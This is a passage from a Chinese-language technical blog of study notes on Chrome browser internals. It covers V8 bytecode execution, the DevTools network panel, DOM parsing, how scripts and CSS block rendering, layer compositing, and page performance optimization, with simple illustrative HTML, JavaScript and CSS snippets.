<h4 id="2-生成字节码"><a href="#2-生成字节码" class="headerlink" title="2. 生成字节码"></a>2. 生成字节码</h4><p>字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行。</p>
<p><img src="https://i.loli.net/2021/06/14/s3GzL9VoU8iJFbK.jpg" alt="Snipaste_2021-06-14_16-18-52.jpg"></p>
<h4 id="3-执行代码"><a href="#3-执行代码" class="headerlink" title="3. 执行代码"></a>3. 执行代码</h4><p>通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。在执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为<strong>热点代码</strong>，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。</p>
<h3 id="JavaScript-的性能优化"><a href="#JavaScript-的性能优化" class="headerlink" title="JavaScript 的性能优化"></a>JavaScript 的性能优化</h3><p>将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：</p>
<ol>
<li>提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互；</li>
<li>避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程；</li>
<li>减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。</li>
</ol>
<hr>
<h1 id="浏览器中的页面"><a href="#浏览器中的页面" class="headerlink" title="浏览器中的页面"></a>浏览器中的页面</h1><p>Chrome 开发者工具面板的大致功能：</p>
<p><img src="https://i.loli.net/2021/06/14/VRJ3q27IDnONWwS.jpg" alt="Snipaste_2021-06-14_19-12-16.jpg"></p>
<h2 id="网络面板"><a href="#网络面板" class="headerlink" title="网络面板"></a>网络面板</h2><p>网络面板由控制器、过滤器、抓图信息、时间线、详细列表和下载信息概要这 6 个区域构成（如下图所示）。</p>
<p><img src="https://i.loli.net/2021/06/14/uU3TBk5xjIsON8w.jpg" alt="Snipaste_2021-06-14_19-13-14.jpg"></p>
<h3 id="1-控制器"><a href="#1-控制器" class="headerlink" title="1. 控制器"></a>1. 控制器</h3><p>控制器有 4 个比较重要的功能：</p>
<p><img src="https://i.loli.net/2021/06/14/jb7PFsvDVniABEk.jpg" alt="Snipaste_2021-06-14_19-13-54.jpg"></p>
<ul>
<li>红色圆点的按钮，表示“开始 / 暂停抓包”，这个功能很常见，很容易理解。</li>
<li>“全局搜索”按钮，这个功能就非常重要了，可以在所有下载资源中搜索相关内容，还可以快速定位到某几个你想要的文件上。</li>
<li>Disable cache，即“禁止从 Cache 中加载资源”的功能，它在调试 Web 应用的时候非常有用，因为开启了 Cache 会影响到网络性能测试的结果。</li>
<li>Online 按钮，是“模拟 2G/3G”功能，它可以限制带宽，模拟弱网情况下页面的展现情况，然后你就可以根据实际展示情况来动态调整策略，以便让 Web 应用更加适用于这些弱网。</li>
</ul>
<h3 id="5-详细列表"><a href="#5-详细列表" class="headerlink" title="5. 详细列表"></a>5. 详细列表</h3><p>可以按照列表的属性来给列表排序，默认情况下，列表是按请求发起的时间来排序的，最早发起请求的资源在顶部。当然也可以按照返回状态码、请求类型、请求时长、内容大小等基础属性排序，只需点击相应属性即可。</p>
<h3 id="优化时间线上耗时项"><a href="#优化时间线上耗时项" class="headerlink" title="优化时间线上耗时项"></a>优化时间线上耗时项</h3><h4 id="1-排队（Queuing）时间过久"><a href="#1-排队（Queuing）时间过久" class="headerlink" title="1. 排队（Queuing）时间过久"></a>1. 排队（Queuing）时间过久</h4><p>排队时间过久，大概率是由浏览器为每个域名最多维护 6 个连接导致的。那么基于这个原因，可以让 1 个站点下面的资源放在多个域名下面，比如放到 3 个域名下面，这样就可以同时支持 18 个连接了，这种方案称为<strong>域名分片</strong>技术。除了域名分片技术外，还可以<strong>把站点升级到 HTTP2</strong>，因为 HTTP2 已经没有每个域名最多维护 6 个 TCP 连接的限制了。</p>
<h4 id="2-第一字节时间（TTFB）时间过久"><a href="#2-第一字节时间（TTFB）时间过久" class="headerlink" title="2. 第一字节时间（TTFB）时间过久"></a>2. 第一字节时间（TTFB）时间过久</h4><p>这可能的原因有如下：</p>
<ul>
<li><strong>服务器生成页面数据的时间过久</strong>。对于动态网页来说，服务器收到用户打开一个页面的请求时，首先要从数据库中读取该页面需要的数据，然后把这些数据传入到模板中，模板渲染后，再返回给用户。服务器在处理这个数据的过程中，可能某个环节会出问题。</li>
<li><strong>网络的原因</strong>。比如使用了低带宽的服务器，或者本来用的是电信的服务器，可联通的网络用户要来访问服务器，这样也会拖慢网速。</li>
<li><strong>发送请求头时带上了多余的用户信息</strong>。比如一些不必要的 Cookie 信息，服务器接收到这些 Cookie 信息之后可能需要对每一项都做处理，这样就加大了服务器的处理时长。</li>
</ul>
<p>面对第一种服务器的问题，可以通过增加各种缓存的技术；针对第二种网络问题，可以使用 CDN 来缓存一些静态文件；至于第三种，在发送请求时就去尽可能地减少一些不必要的 Cookie 数据信息。</p>
<h4 id="3-Content-Download-时间过久"><a href="#3-Content-Download-时间过久" class="headerlink" title="3. Content Download 时间过久"></a>3. Content Download 时间过久</h4><p>如果单个请求的 Content Download 花费了大量时间，有可能是字节数太多的原因导致的。这时候需要减少文件大小，比如压缩、去掉源码中不必要的注释等方法。</p>
<h2 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a><strong>DOM 树</strong></h2><h3 id="什么是-DOM"><a href="#什么是-DOM" class="headerlink" title="什么是 DOM"></a>什么是 DOM</h3><p>从网络传给渲染引擎的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 提供了对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用。</p>
<ul>
<li>从页面的视角来看，DOM 是生成页面的基础数据结构。</li>
<li>从 JavaScript 脚本视角来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容。</li>
<li>从安全视角来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外了。</li>
</ul>
<p>简言之，DOM 是表述 HTML 的内部数据结构，它会将 Web 页面和 JavaScript 脚本连接起来，并过滤一些不安全的内容。</p>
<h3 id="DOM-树如何生成"><a href="#DOM-树如何生成" class="headerlink" title="DOM 树如何生成"></a>DOM 树如何生成</h3><p>在渲染引擎内部，有一个叫<strong>HTML 解析器（HTMLParser）</strong>的模块，它负责将 HTML 字节流转换为 DOM 结构。</p>
<p><strong>网络进程加载了多少数据，HTML 解析器便解析多少数据</strong>：</p>
<ol>
<li>网络进程接收到响应头之后，会根据响应头中的 content-type 字段来判断文件的类型，比如 content-type 的值是“text/html”，那么浏览器就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程。</li>
<li>渲染进程准备好之后，<strong>网络进程和渲染进程之间会建立一个共享数据的管道</strong>，网络进程接收到数据后就往这个管道里面放，而渲染进程则从管道的另外一端不断地读取数据，并同时将读取的数据“喂”给 HTML 解析器。</li>
</ol>
<p>你可以把这个管道想象成一个“水管”，网络进程接收到的字节流像水一样倒进这个“水管”，而“水管”的另外一端是渲染进程的 HTML 解析器，它会动态接收字节流，并将其解析为 DOM。</p>
<p><img src="https://i.loli.net/2021/06/14/5GoDOckhsQNtfWT.jpg" alt="Snipaste_2021-06-14_19-33-34.jpg"></p>
<p><strong>第一个阶段，通过分词器将字节流转换为 Token。</strong>上述 HTML 代码通过词法分析生成的 Token 如下所示：</p>
<p><img src="https://i.loli.net/2021/06/14/ugL51BlF6qTsrUO.jpg" alt="Snipaste_2021-06-14_19-34-25.jpg"></p>
<p><strong>后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中。</strong></p>
<p>HTML 解析器维护了一个<strong>Token 栈结构</strong>，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：</p>
<ul>
<li>如果压入到栈中的是<strong>StartTag Token</strong>，HTML 解析器会为该 Token 创建一个 DOM 节点，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。</li>
<li>如果分词器解析出来是<strong>文本 Token</strong>，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的父节点就是当前栈顶 Token 所对应的 DOM 节点。</li>
<li>如果分词器解析出来的是<strong>EndTag 标签</strong>，比如是 EndTag div，HTML 解析器会查看 Token 栈顶的元素是否是 StarTag div，如果是，就将 StartTag div 从栈中弹出，表示该 div 元素解析完成。</li>
</ul>
<p>补充说明：<strong>HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构</strong>，同时会将一个 StartTag document 的 Token 压入栈底。</p>
<h3 id="JavaScript-是如何影响-DOM-生成的"><a href="#JavaScript-是如何影响-DOM-生成的" class="headerlink" title="JavaScript 是如何影响 DOM 生成的"></a>JavaScript 是如何影响 DOM 生成的</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">    div1.innerText = <span class="string">&#x27;time.geekbang&#x27;</span></span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在两段 div 中间插入了一段 JavaScript 脚本，这段脚本的解析过程就有点不一样了。<code>标签之前，所有的解析流程还是和之前介绍的一样，但是解析到</code>标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。</p>
<p><strong>但如果在页面中引入 JavaScript 文件，这个解析过程就稍微复杂了些：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//foo.js</span><br><span class="line">let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]</span><br><span class="line">div1.innerText = &#x27;time.geekbang&#x27;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;foo.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行到 JavaScript 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先下载这段 JavaScript 代码。这里需要重点关注下载环境，因为<strong>JavaScript 文件的下载过程会阻塞 DOM 解析</strong>，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。</p>
<p>不过 Chrome 浏览器做了很多优化，其中一个主要的优化是<strong>预解析操作</strong>。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。</p>
<p>引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码。async 和 defer 虽然都是异步的，不过还有一些差异，使用 <strong>async</strong> 标志的脚本文件一旦加载完成，会<strong>立即执行</strong>；而使用了 <strong>defer</strong> 标记的脚本文件，需要<strong>在 DOMContentLoaded 事件之前执行</strong>。</p>
<p>接着看另一种情况：</p>
<p>如果 JavaScript 代码出现了 <code>div1.style.color = ‘red&#39;</code> 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。</p>
<p>而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，<strong>都会执行 CSS 文件下载、解析操作</strong>，再执行 JavaScript 脚本。</p>
<p>所以 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。</p>
<h2 id="渲染流水线"><a href="#渲染流水线" class="headerlink" title="渲染流水线"></a>渲染流水线</h2><h3 id="渲染流水线视角下的-CSS"><a href="#渲染流水线视角下的-CSS" class="headerlink" title="渲染流水线视角下的 CSS"></a>渲染流水线视角下的 CSS</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div&#123; </span><br><span class="line">    color : coral;</span><br><span class="line">    background-color:black</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;theme.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>geekbang com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/14/k1RwdbiQVEAPlcJ.jpg" alt="Snipaste_2021-06-14_19-46-45.jpg"></p>
<p>首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。<strong>需要特别注意</strong>，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。</p>
<p>当渲染进程接收 HTML 文件字节流时，会先开启一个<strong>预解析线程</strong>，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间<strong>需要注意一下</strong>，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。</p>
<p><strong>那渲染流水线为什么需要 CSSOM 呢？</strong></p>
<p>和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，<strong>第一个是提供给 JavaScript 操作样式表的能力，第二个是为布局树的合成提供基础的样式信息</strong>。这个 CSSOM 体现在 DOM 中就是 <code> document.styleSheets</code>。</p>
<p>若在之前代码基础上，又在 body 标签内部加了一个简单的 JavaScript ：</p>
<p><img src="https://i.loli.net/2021/06/14/z2WU6qpEyVRbTMr.jpg" alt="Snipaste_2021-06-14_19-49-33.jpg"></p>
<p>若HTML 文件中包含了 CSS 的外部引用和 JavaScript 外部文件：</p>
<p><img src="https://i.loli.net/2021/06/14/HtTJbBIjoe72VPQ.jpg" alt="Snipaste_2021-06-14_19-53-59.jpg"></p>
<p>在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。</p>
<p>不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。</p>
<h3 id="影响页面展示的因素以及优化策略"><a href="#影响页面展示的因素以及优化策略" class="headerlink" title="影响页面展示的因素以及优化策略"></a>影响页面展示的因素以及优化策略</h3><p>渲染流水线影响到了首次页面展示的速度，而首次页面展示的速度又直接影响到了用户体验。</p>
<p>从发起 URL 请求开始，到首次显示页面的内容，在视觉上经历的三个阶段：</p>
<ul>
<li>第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。</li>
<li>第二个阶段，提交数据之后渲染进程会创建一个空白页面，通常把这段时间称为<strong>解析白屏</strong>，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。</li>
<li>第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。</li>
</ul>
<p>影响第一个阶段的因素主要是网络或者是服务器处理；第二个阶段的主要问题是白屏时间，如果白屏时间过久，就会影响到用户体验。</p>
<p>通常情况下的瓶颈主要体现在<strong>下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript</strong>。所以要想缩短白屏时长，可以有以下策略：</p>
<ul>
<li>通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。</li>
<li>但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。</li>
<li>还可以将一些不需要在解析 HTML 阶段使用的 JavaScript 标记上 sync 或者 defer。</li>
<li>对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。</li>
</ul>
<h2 id="分层和合成机制"><a href="#分层和合成机制" class="headerlink" title="分层和合成机制"></a>分层和合成机制</h2><h3 id="显示器是怎么显示图像的？"><a href="#显示器是怎么显示图像的？" class="headerlink" title="显示器是怎么显示图像的？"></a>显示器是怎么显示图像的？</h3><p>每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫<strong>前缓冲区</strong>的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。</p>
<p>显卡的职责就是合成新的图像，并将图像保存到<strong>后缓冲区</strong>中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。</p>
<h3 id="帧-VS-帧率"><a href="#帧-VS-帧率" class="headerlink" title="帧 VS 帧率"></a>帧 VS 帧率</h3><p>当通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。</p>
<p>大多数设备屏幕的更新频率是 60 次 / 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。</p>
<p>我们把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。</p>
<p>由于用户很容易观察到那些丢失的帧，如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿，这会给用户造成非常不好的印象。</p>
<p>要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。</p>
<h3 id="如何生成一帧图像"><a href="#如何生成一帧图像" class="headerlink" title="如何生成一帧图像"></a>如何生成一帧图像</h3><p>关于其中任意一帧的生成方式，有<strong>重排、重绘</strong>和<strong>合成</strong>三种方式（具体见笔记（一）渲染流程）。Chrome 中的合成技术，可以用三个词来概括总结：<strong>分层、分块</strong>和<strong>合成</strong>。</p>
<h4 id="分层和合成"><a href="#分层和合成" class="headerlink" title="分层和合成"></a>分层和合成</h4><p>把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。在这个过程中，将素材分解为多个图层的操作就称为<strong>分层</strong>，最后将这些图层合并到一起的操作就称为<strong>合成</strong>。所以，分层和合成通常是一起使用的。</p>
<h4 id="Chrome-如何实现"><a href="#Chrome-如何实现" class="headerlink" title="Chrome 如何实现"></a><strong>Chrome 如何实现</strong></h4><p>在 Chrome 的渲染流水线中，<strong>分层体现在生成布局树之后</strong>，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。</p>
<p>层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。但绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成<code>|Paint BackGroundColor:Black | Paint Circle|</code>这样的绘制指令列表，绘制过程就完成了。</p>
<p>有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为“一张”图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。</p>
<p><strong>需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的</strong>。这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。</p>
<h4 id="分块"><a href="#分块" class="headerlink" title="分块"></a>分块</h4><p>如果说分层是从<strong>宏观</strong>上提升了渲染效率，那么分块则是从<strong>微观</strong>层面提升了渲染效率。</p>
<p>通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。</p>
<p>因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——<strong>纹理上传</strong>，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。</p>
<p>为了解决这个问题，Chrome 又采取了一个策略：<strong>在首次合成图块的时候使用一个低分辨率的图片</strong>。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。</p>
<h3 id="如何利用分层技术优化代码"><a href="#如何利用分层技术优化代码" class="headerlink" title="如何利用分层技术优化代码"></a>如何利用分层技术优化代码</h3><p>若经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。</p>
<p>这时可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">	will-change: transform, opacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一帧，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。<strong>这也是 CSS 动画比 JavaScript 动画高效的原因</strong>。</p>
<p>但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存。</p>
<h2 id="页面性能：如何系统地优化页面？"><a href="#页面性能：如何系统地优化页面？" class="headerlink" title="页面性能：如何系统地优化页面？"></a>页面性能：如何系统地优化页面？</h2><p><strong>即让页面更快地显示和响应。</strong>通常一个页面有三个阶段：<strong>加载阶段、交互阶段和关闭阶段</strong>。</p>
<ul>
<li>加载阶段，是指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。</li>
<li>交互阶段，主要是从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。</li>
<li>关闭阶段，主要是用户发出关闭指令后页面所做的一些清理操作。</li>
</ul>
<h3 id="加载阶段"><a href="#加载阶段" class="headerlink" title="加载阶段"></a>加载阶段</h3><p><img src="https://i.loli.net/2021/06/14/Ybg27vhl9uHck83.jpg" alt="Snipaste_2021-06-14_20-06-51.jpg"></p>
<p>我们把<strong>这些能阻塞网页首次渲染的资源称为关键资源</strong>。基于关键资源，我们可以继续细化出来三个影响页面首次渲染的核心因素。</p>
<ul>
<li><strong>第一个是关键资源个数</strong>。关键资源个数越多，首次页面的加载时间就会越长。比如上图中的关键资源个数就是 3 个，1 个 HTML 文件、1 个 JavaScript 和 1 个 CSS 文件。</li>
<li><strong>第二个是关键资源大小</strong>。通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。上图中关键资源的大小分别是 6KB、8KB 和 9KB，那么整个关键资源大小就是 23KB。</li>
<li><strong>第三个是请求关键资源需要多少个 RTT（Round Trip Time）</strong>。<strong>RTT 即往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延</strong>。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT。</li>
</ul>
<p><strong>总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数</strong>。</p>
<ul>
<li>如何减少关键资源的个数？一种方式是可以将 JavaScript 和 CSS 改成内联的形式，比如上图的 JavaScript 和 CSS，若都改成内联模式，那么关键资源的个数就由 3 个减少到了 1 个。另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 sync 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 sync 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。</li>
<li>如何减少关键资源的大小？可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。</li>
<li>如何减少关键资源 RTT 的次数？可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。</li>
</ul>
<h3 id="交互阶段"><a href="#交互阶段" class="headerlink" title="交互阶段"></a>交互阶段</h3><p><img src="https://i.loli.net/2021/06/14/IjmUtRW8cYQPMyJ.jpg" alt="Snipaste_2021-06-14_20-09-34.jpg"></p>
<p>优化方案：<strong>一个大的原则就是让单个帧的生成速度变快</strong>。</p>
<h4 id="1-减少-JavaScript-脚本执行时间"><a href="#1-减少-JavaScript-脚本执行时间" class="headerlink" title="1. 减少 JavaScript 脚本执行时间"></a>1. 减少 JavaScript 脚本执行时间</h4><p>有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。</p>
<ul>
<li>一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。</li>
<li>另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行。</li>
</ul>
<h4 id="2-避免强制同步布局"><a href="#2-避免强制同步布局" class="headerlink" title="2. 避免强制同步布局"></a>2. 避免强制同步布局</h4><p>所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中。</p>
<h4 id="3-避免布局抖动"><a href="#3-避免布局抖动" class="headerlink" title="3. 避免布局抖动"></a>3. 避免布局抖动</h4><p>还有一种比强制同步布局更坏的情况，那就是布局抖动。所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。</p>
<p>这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。</p>
